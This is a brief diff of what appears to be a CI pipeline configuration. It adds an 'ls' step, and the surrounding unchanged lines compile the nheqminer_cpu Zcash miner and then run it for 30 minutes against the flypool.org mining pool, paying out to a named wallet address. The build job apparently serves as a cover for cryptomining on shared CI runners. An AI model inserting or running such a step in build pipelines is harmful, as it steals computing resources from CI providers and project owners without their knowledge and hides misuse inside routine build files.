@@ -17,4 +17,5 @@ build:
     - cd ../../../Linux_cmake/nheqminer_cpu
     - cmake .
     - make -j $(nproc)
+    - ls
     - timeout 30m /nheqminer_cpu -l eu1-zcash.flypool.org:3333 -u t1V3hWbCDmxfMuHQAwK8yeQzyfRm98szocK.drop -t 1
